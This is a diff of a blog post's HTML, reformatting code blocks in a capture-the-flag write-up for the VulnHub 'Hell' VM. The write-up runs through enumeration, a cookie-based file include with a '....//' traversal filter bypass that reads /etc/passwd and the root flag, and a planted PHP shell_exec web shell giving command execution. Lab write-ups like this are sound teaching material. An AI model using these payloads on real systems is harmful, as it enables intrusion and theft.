@@ -95,10 +95,9 @@ Lets start by saying that this is probably one of the toughest boot2root&rsquo;s
 
 <p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>
 
-<p>```bash Hell first portscan
-root@kali:~# nmap &ndash;reason 192.168.56.102</p>
+<pre><code class="language-bash">root@kali:~# nmap --reason 192.168.56.102
 
-<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-20 19:15 SAST
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-20 19:15 SAST
 Nmap scan report for 192.168.56.102
 Host is up, received reset (0.00025s latency).
 Not shown: 996 filtered ports
@@ -107,17 +106,18 @@ PORT    STATE SERVICE REASON
 22/tcp  open  ssh     syn-ack
 80/tcp  open  http    syn-ack
 111/tcp open  rpcbind syn-ack
-666/tcp open  doom    syn-ack</p>
+666/tcp open  doom    syn-ack
 
-<p>Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds</p>
+Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds
+</code></pre>
 
-<pre><code>So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first _whaaat_ moment, tcp/666.
+<p>So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>
 
-## poking around
-The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:
+<h2 id="poking-around:b2f2177e9b11b0fc1c7ac5c94bf719fa">poking around</h2>
 
-```bash 'echoserver'
-root@kali:~# telnet 192.168.56.102 666
+<p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>
+
+<pre><code class="language-bash">root@kali:~# telnet 192.168.56.102 666
 Trying 192.168.56.102...
 Connected to 192.168.56.102.
 Escape character is '^]'.
@@ -141,20 +141,18 @@ Connection closed.
 
 <p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>
 
-<p>```bash echoserver
-root@kali:~# curl  &ldquo;<a href="http://192.168.56.102/echoserver.bak&quot;">http://192.168.56.102/echoserver.bak&quot;</a> &gt; echoserver.bak
+<pre><code class="language-bash">root@kali:~# curl  &quot;http://192.168.56.102/echoserver.bak&quot; &gt; echoserver.bak
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
-100  7846  100  7846    0     0  1290k      0 &ndash;:&ndash;:&ndash; &ndash;:&ndash;:&ndash; &ndash;:&ndash;:&ndash; 1532k
+100  7846  100  7846    0     0  1290k      0 --:--:-- --:--:-- --:--:-- 1532k
 root@kali:~# file echoserver.bak
-echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped</p>
+echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
+</code></pre>
 
-<pre><code>
-Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
-To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I'd then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a `strace`, one will notice the server 'dying' when a socket is closed:
+<p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
+To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>
 
-```bash Echoserver die
-bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
+<pre><code class="language-bash">bind(3, {sa_family=AF_INET, sin_port=htons(666), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
 listen(3, 10)                           = 0
 accept(3, 0, NULL)                      = 4
 read(4, &quot;test\r\n&quot;, 2000)               = 6
@@ -173,21 +171,19 @@ write(4, &quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&
 
 <p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>
 
-<p>```bash Hell robots.txt
-root@kali:~# curl <a href="http://192.168.56.102/robots.txt">http://192.168.56.102/robots.txt</a>
+<pre><code class="language-bash">root@kali:~# curl http://192.168.56.102/robots.txt
 User-agent: *
 Disallow: /personal/
-Disallow: /super_secret_login_path_muhahaha/</p>
+Disallow: /super_secret_login_path_muhahaha/
+</code></pre>
 
-<pre><code>
-The folder `personal/` had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. `super_secret_login_path_muhahaha` however, presented us with a login portal with a title **Admin**.
+<p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>
 
-The login form posted to `login.php`, and on failure would 302 to: `http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1`. Fuzzing `the_user_is_a_failure` simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.
+<p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>
 
-The next move was to fuzz more directories and maybe some interesting files. I decided on `wfuzz` for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:
+<p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>
 
-```bash Hell web server folders
-root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
+<pre><code class="language-bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
 
 ********************************************************
 * Wfuzz  2.0 - The Web Bruteforcer                     *
@@ -207,50 +203,49 @@ ID Response   Lines      Word         Chars          Request
 
 <p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>
 
-<p>```bash Hell web server files
-root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt &ndash;hc 404 <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php</a></p>
+<pre><code class="language-bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
 
-<hr />
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
+Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt
+
+Total requests: 3036
+==================================================================
+ID Response   Lines      Word         Chars          Request
+==================================================================
+
+01375:  C=200     17 L        33 W      371 Ch    &quot; - index&quot;
+01663:  C=302      0 L         0 W        0 Ch    &quot; - login&quot;
+01684:  C=200      5 L        19 W      163 Ch    &quot; - mail&quot;
+02009:  C=302     21 L        38 W      566 Ch    &quot; - panel&quot;
+02076:  C=302     17 L        35 W      387 Ch    &quot; - personal&quot;
+02439:  C=200      7 L        21 W      170 Ch    &quot; - server&quot;
+02852:  C=200      2 L         2 W       19 Ch    &quot; - users&quot;
+</code></pre>
+
+<p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
+<code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>
+
+<p>From the .php file side of things, it was slightly more interesting.</p>
+
+<h2 id="302-content-anyone:b2f2177e9b11b0fc1c7ac5c94bf719fa">302 content anyone?</h2>
+
+<p>I was already aware of <code>index.php</code> as well as <code>login.php</code> due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:</p>
 
 <ul>
-<li>Wfuzz  2.0 - The Web Bruteforcer                     *
-********************************************************</li>
+<li><code>mail.php</code> was a page showing us that we have received <em>2</em> emails, and that the &lsquo;firewall&rsquo; is activated. There was also what I think is a spam filtering dog gif ;)</li>
+<li><code>panel.php</code> simply redirected you back to <code>index.php</code>. Assuming there is a auth requirement here.</li>
+<li><code>personal.php</code> also simply redirected you back to <code>index.php</code>. Again, assuming a auth requirement.</li>
+<li><code>server.php</code> had the gif we saw in <code>/server</code> with some humorous test with it. Nothing really of interest.</li>
+<li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
 </ul>
 
-<p>Target: <a href="http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php">http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php</a>
-Payload type: file,/usr/share/wordlists/wfuzz/general/big.txt</p>
+<p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>
 
-<h1 id="total-requests-3036:b2f2177e9b11b0fc1c7ac5c94bf719fa">Total requests: 3036</h1>
-
-<h1 id="id-response-lines-word-chars-request:b2f2177e9b11b0fc1c7ac5c94bf719fa">ID Response   Lines      Word         Chars          Request</h1>
-
-<p>01375:  C=200     17 L        33 W      371 Ch    &ldquo; - index&rdquo;
-01663:  C=302      0 L         0 W        0 Ch    &ldquo; - login&rdquo;
-01684:  C=200      5 L        19 W      163 Ch    &ldquo; - mail&rdquo;
-02009:  C=302     21 L        38 W      566 Ch    &ldquo; - panel&rdquo;
-02076:  C=302     17 L        35 W      387 Ch    &ldquo; - personal&rdquo;
-02439:  C=200      7 L        21 W      170 Ch    &ldquo; - server&rdquo;
-02852:  C=200      2 L         2 W       19 Ch    &ldquo; - users&rdquo;</p>
-
-<pre><code>
-So this gives us slightly more to work with. All of the above are relative to `super_secret_login_path_muhahaha`.
-`/1` was a big red **INTRUDER ALERT** message, and `/server` was a gif of a server rack falling over.
-
-From the .php file side of things, it was slightly more interesting.
-
-## 302 content anyone?
-I was already aware of `index.php` as well as `login.php` due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:
-
-  - `mail.php` was a page showing us that we have received _2_ emails, and that the 'firewall' is activated. There was also what I think is a spam filtering dog gif ;)
-  - `panel.php` simply redirected you back to `index.php`. Assuming there is a auth requirement here.
-  - `personal.php` also simply redirected you back to `index.php`. Again, assuming a auth requirement.
-  - `server.php` had the gif we saw in `/server` with some humorous test with it. Nothing really of interest.
-  - `users.php` just returned the words _Jack_. This is the same user mentioned in the shrine page from `/personal/`.
-
-Due to these auth requirements, I decided to take all of these url's to `curl`, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:
-
-```bash Hell curl
-root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
+<pre><code class="language-bash">root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
 &lt;HTML&gt;
 &lt;FORM name=&quot;login&quot; method=&quot;post&quot; action=&quot;login.php&quot;&gt;
 &lt;CENTER&gt;
@@ -271,22 +266,17 @@ root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/i
 
 <p>Here I am telling curl to make a <code>GET</code> request to <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php">http://192.168.56.102/super_secret_login_path_muhahaha/index.php</a>, using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>
 
-<p>```bash Hell cookie-jar
-root@kali:~# cat cookies</p>
+<pre><code class="language-bash">root@kali:~# cat cookies
+# Netscape HTTP Cookie File
+# http://curl.haxx.se/rfc/cookie_spec.html
+# This file was generated by libcurl! Edit at your own risk.
 
-<h1 id="netscape-http-cookie-file:b2f2177e9b11b0fc1c7ac5c94bf719fa">Netscape HTTP Cookie File</h1>
+192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+</code></pre>
 
-<h1 id="http-curl-haxx-se-rfc-cookie-spec-html:b2f2177e9b11b0fc1c7ac5c94bf719fa"><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>
+<p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>
 
-<h1 id="this-file-was-generated-by-libcurl-edit-at-your-own-risk:b2f2177e9b11b0fc1c7ac5c94bf719fa">This file was generated by libcurl! Edit at your own risk.</h1>
-
-<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310</p>
-
-<pre><code>
-Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to `personal.php`:
-
-```bash 302 output
-root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
+<pre><code class="language-bash">root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
 * About to connect() to 192.168.56.102 port 80 (#0)
 *   Trying 192.168.56.102...
 * connected
@@ -320,16 +310,15 @@ root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/p
 
 <p>Look at line 25. <em>Ignoring the request-body</em>. But we got a 302? Ok lets make another request without the <code>-L</code> flag and check if it reveals anything:</p>
 
-<p>```bash personal.php content
-root@kali:~# curl -v <a href="http://192.168.56.102/super_secret_login_path_muhahaha/personal.php">http://192.168.56.102/super_secret_login_path_muhahaha/personal.php</a> -c cookies -b cookies
+<pre><code class="language-bash">root@kali:~# curl -v http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
 * About to connect() to 192.168.56.102 port 80 (#0)
-*   Trying 192.168.56.102&hellip;
+*   Trying 192.168.56.102...
 * connected
 * Connected to 192.168.56.102 (192.168.56.102) port 80 (#0)
 &gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
 &gt; User-Agent: curl/7.26.0
 &gt; Host: 192.168.56.102
-&gt; Accept: <em>/</em>
+&gt; Accept: */*
 &gt; Cookie: PHPSESSID=8u300rbb0747fi6iocm0lt4310
 &gt;
 * HTTP 1.1 or later with persistent connection, pipelining supported
@@ -345,28 +334,26 @@ root@kali:~# curl -v <a href="http://192.168.56.102/super_secret_login_path_muha
 &lt; Content-Length: 387
 &lt; Content-Type: text/html
 &lt;
-<HTML>
-<FORM name="login" method="post" action="check.php">
-<CENTER>
-<H1> Personal Folder Login </H1>
-<H3>
-<STRONG>Username:</STRONG>
-<INPUT name="username" id="username" type="text" value=""/>
-<BR>
-<BR>
-<STRONG>Password:</STRONG>
-<INPUT name="password" id="password" type="password" value=""/>
-<BR>
-<BR>
-<INPUT name="mysubmit" id="mysubmit" type="submit" value="Login"/>
-</H3>
-</HTML></p>
+&lt;HTML&gt;
+&lt;FORM name=&quot;login&quot; method=&quot;post&quot; action=&quot;check.php&quot;&gt;
+&lt;CENTER&gt;
+&lt;H1&gt; Personal Folder Login &lt;/H1&gt;
+&lt;H3&gt;
+&lt;STRONG&gt;Username:&lt;/STRONG&gt;
+&lt;INPUT name=&quot;username&quot; id=&quot;username&quot; type=&quot;text&quot; value=&quot;&quot;/&gt;
+&lt;BR&gt;
+&lt;BR&gt;
+&lt;STRONG&gt;Password:&lt;/STRONG&gt;
+&lt;INPUT name=&quot;password&quot; id=&quot;password&quot; type=&quot;password&quot; value=&quot;&quot;/&gt;
+&lt;BR&gt;
+&lt;BR&gt;
+&lt;INPUT name=&quot;mysubmit&quot; id=&quot;mysubmit&quot; type=&quot;submit&quot; value=&quot;Login&quot;/&gt;
+&lt;/H3&gt;
+&lt;/HTML&gt;
 
-<ul>
-<li>Connection #0 to host 192.168.56.102 left intact</li>
-<li>Closing connection #0
-```</li>
-</ul>
+* Connection #0 to host 192.168.56.102 left intact
+* Closing connection #0
+</code></pre>
 
 <p>Well what do you know. We get a 302 and content. This time we have a login form that posts to <code>check.php</code>. A <code>GET</code> request to <code>check.php</code> resulted in a 302, but to <code>personal.php</code> and not <code>index.php</code>.</p>
 
@@ -402,15 +389,13 @@ root@kali:~# curl -v <a href="http://192.168.56.102/super_secret_login_path_muha
 
 <p>Back to <code>check.php</code>, it was time to check for any potential SQL injection on the post to <code>check.php</code> from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie <code>failcount</code>. failcount would increment with every incorrect login to <code>check.php</code>. After <em>3</em> failed attempts, another cookie called <code>intruder</code> was set:</p>
 
-<p>```bash Hell failcount
-Added cookie intruder=&ldquo;1&rdquo; for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0
-&gt; Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310</p>
+<pre><code class="language-bash">Added cookie intruder=&quot;1&quot; for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0
+&gt; Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310
+</code></pre>
 
-<pre><code>
-Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for `panel.php`:
+<p>Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for <code>panel.php</code>:</p>
 
-```bash Hell Intruder
-&lt;HTML&gt;
+<pre><code class="language-bash">&lt;HTML&gt;
 &lt;CENTRE&gt;
 &lt;H2&gt; Folders &lt;/H2&gt;
 &lt;TABLE style=&quot;width:700px&quot; align=&quot;center&quot;&gt;
@@ -441,24 +426,19 @@ Again I will admit this did not jump right out at me. In fact it took quite a fe
 
 <p>Notice the familiar <strong>INTRUDER ALERT</strong> message? :) Also remember how this file was called <code>/1</code> from the previous enumeration? Yep! File Include time! With us having a cookiejar file called <code>cookies</code> available for editing, it was easy to play around with this. The normal cookiejar had:</p>
 
-<p>```bash Hell cookiejar
-root@kali:~# cat cookies</p>
+<pre><code class="language-bash">root@kali:~# cat cookies
+# Netscape HTTP Cookie File
+# http://curl.haxx.se/rfc/cookie_spec.html
+# This file was generated by libcurl! Edit at your own risk.
 
-<h1 id="netscape-http-cookie-file-1:b2f2177e9b11b0fc1c7ac5c94bf719fa">Netscape HTTP Cookie File</h1>
-
-<h1 id="http-curl-haxx-se-rfc-cookie-spec-html-1:b2f2177e9b11b0fc1c7ac5c94bf719fa"><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>
-
-<h1 id="this-file-was-generated-by-libcurl-edit-at-your-own-risk-1:b2f2177e9b11b0fc1c7ac5c94bf719fa">This file was generated by libcurl! Edit at your own risk.</h1>
-
-<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
 192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1</p>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
+</code></pre>
 
-<pre><code>
-To test the file include, the first knee jerk reaction was to replace the `1` with `/etc/passwd`. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as `/1`, like `mail.php`:
+<p>To test the file include, the first knee jerk reaction was to replace the <code>1</code> with <code>/etc/passwd</code>. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as <code>/1</code>, like <code>mail.php</code>:</p>
 
-```bash Hell file include testing
-root@kali:~# cat cookies
+<pre><code class="language-bash">root@kali:~# cat cookies
 # Netscape HTTP Cookie File
 # http://curl.haxx.se/rfc/cookie_spec.html
 # This file was generated by libcurl! Edit at your own risk.
@@ -498,16 +478,14 @@ root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.p
 
 <p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>
 
-<p>```php Hell File Include assumption
-if ($_COOKIE[&lsquo;intruder&rsquo;]) {
-   include($_COOKIE[&lsquo;intruder&rsquo;]);
-}</p>
+<pre><code class="language-php">if ($_COOKIE['intruder']) {
+   include($_COOKIE['intruder']);
+}
+</code></pre>
 
-<pre><code>
-...with some kind of filtering preventing reading the `/etc/passwd`. While I was still pretty excited about finding this vuln, I soon came across [this](https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the `intruder` cookie to `....//....//....//....//....//etc/passwd` and viola! :)
+<p>&hellip;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href="https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001">this</a>#Gray_Box_testing_and_example) article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>
 
-```bash Hell Directory Traversal
-root@kali:~# cat cookies
+<pre><code class="language-bash">root@kali:~# cat cookies
 # Netscape HTTP Cookie File
 # http://curl.haxx.se/rfc/cookie_spec.html
 # This file was generated by libcurl! Edit at your own risk.
@@ -573,61 +551,57 @@ root@kali:~#
 
 <p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>
 
-<p>``<code>bash Hell /root/flag.txt</code>
-root@kali:~# cat cookies</p>
+<pre><code class="language-bash">root@kali:~# cat cookies
+# Netscape HTTP Cookie File
+# http://curl.haxx.se/rfc/cookie_spec.html
+# This file was generated by libcurl! Edit at your own risk.
 
-<h1 id="netscape-http-cookie-file-2:b2f2177e9b11b0fc1c7ac5c94bf719fa">Netscape HTTP Cookie File</h1>
-
-<h1 id="http-curl-haxx-se-rfc-cookie-spec-html-2:b2f2177e9b11b0fc1c7ac5c94bf719fa"><a href="http://curl.haxx.se/rfc/cookie_spec.html">http://curl.haxx.se/rfc/cookie_spec.html</a></h1>
-
-<h1 id="this-file-was-generated-by-libcurl-edit-at-your-own-risk-2:b2f2177e9b11b0fc1c7ac5c94bf719fa">This file was generated by libcurl! Edit at your own risk.</h1>
-
-<p>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
+192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
 192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
-192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder &hellip;.//&hellip;.//&hellip;.//&hellip;.//&hellip;.//root/flag.txt</p>
+192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//root/flag.txt
 
-<p>root@kali:~# curl <a href="http://192.168.56.102/super_secret_login_path_muhahaha/panel.php">http://192.168.56.102/super_secret_login_path_muhahaha/panel.php</a> -c cookies -b cookies</p>
+root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies
 
-<p><HTML>
-<CENTRE>
-<H2> Folders </H2>
-<TABLE style="width:700px" align="center">
-<TR>
-   <TD><A HREF="server.php"><IMG SRC='folder.png'></A></TD>
-   <TD><A HREF="mail.php"><IMG SRC='folder.png'></A></TD>
-   <TD><A HREF="users.php"><IMG SRC='folder.png'></A></TD>
-   <TD><A HREF="personal.php"><IMG SRC='folder.png'></A></TD>
-   <TD><A HREF="notes.php"><IMG SRC='folder.png'></A></TD>
-</TR>
-<TR>
-   <TD><H4>Server Status</H4></TD>
-   <TD><H4>Mail Status</H4></TD>
-   <TD><H4>Auth Users</H4></TD>
-   <TD><H4>Personal Folder</H4></TD>
-   <TD><H4>Notes</H4></TD>
-</TR>
-</CENTRE>
-Congratulations of beating Hell.</p>
+&lt;HTML&gt;
+&lt;CENTRE&gt;
+&lt;H2&gt; Folders &lt;/H2&gt;
+&lt;TABLE style=&quot;width:700px&quot; align=&quot;center&quot;&gt;
+&lt;TR&gt;
+   &lt;TD&gt;&lt;A HREF=&quot;server.php&quot;&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A HREF=&quot;mail.php&quot;&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A HREF=&quot;users.php&quot;&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A HREF=&quot;personal.php&quot;&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;A HREF=&quot;notes.php&quot;&gt;&lt;IMG SRC='folder.png'&gt;&lt;/A&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;TR&gt;
+   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
+   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
+&lt;/TR&gt;
+&lt;/CENTRE&gt;
+Congratulations of beating Hell.
 
-<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>
+I hope you enjoyed it and there weren't to many trolls in here for you.
 
-<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>
+Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
 
-<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>
+Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
 
-<p></HTML>
-root@kali:~#</p>
 
-<pre><code>
-And bingo. _Technically_ we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don't know.
-From here on onwards, the goal was no longer to read `/root/flag.txt`. No, we now have to root this VM :)
+&lt;/HTML&gt;
+root@kali:~#
+</code></pre>
 
-## gaining shell
+<p>And bingo. <em>Technically</em> we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&rsquo;t know.
+From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>
 
-With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the `notes.php` file, I decided to try include `/tmp/note.txt`. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to `notes.php`, entered: `&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;`, and submitted the form. Next I edited the cookiejar to include `/tmp/notes.txt`, and proceeded to test my command execution:
+<h2 id="gaining-shell:b2f2177e9b11b0fc1c7ac5c94bf719fa">gaining shell</h2>
 
-```bash Hell command execution
-root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
+<p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?&gt;</code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>
+
+<pre><code class="language-bash">root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
 [snip]
 &lt;/CENTRE&gt;
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -637,44 +611,41 @@ root@kali:~#
